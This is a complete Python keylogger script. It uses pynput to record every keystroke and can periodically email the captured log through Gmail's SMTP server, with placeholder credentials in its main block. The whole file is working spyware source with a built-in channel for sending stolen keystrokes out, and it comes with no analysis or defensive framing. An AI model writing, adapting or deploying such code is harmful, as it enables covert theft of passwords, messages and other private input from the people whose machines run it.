#!/usr/bin/env python3
from pynput import keyboard
from threading import Timer
import smtplib


class KeyLogger:
    def __init__(self, remote_logging=False, email="", password=""):
        self.log = ""
        self.remote_logging = remote_logging
        if(remote_logging and (not email or not password)):
            raise ValueError("Must provide email and password if doing remote logging")
        else:
            self.email = email
            self.password = password


    def _send_email(self, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(self.email, self.password)
        server.sendmail(self.email, self.email, "\n\n" + message)
        server.quit()


    def _start_logging(self):
        if(len(self.log) > 0):
            if(self.remote_logging):
                self._send_email(self.log)
            else:
                print(self.log)

            self.log = ""

        timer = Timer(self.interval, self._start_logging)
        timer.start()


    def _callback(self, key):
        try:
            self.log += str(key.char)
        except AttributeError:
            if key == key.space:
                self.log += ' '
            else:
                self.log += ' <' + str(key) + '> '

    def start(self, interval=300):
        self.interval = interval
        with keyboard.Listener(on_press=self._callback) as listener:
            self._start_logging()
            listener.join()


if __name__ == "__main__":
    keylogger = KeyLogger(False, "yahrightbuddy@gmail.com", "goaway,sneakthief")
    keylogger.start(interval=5)

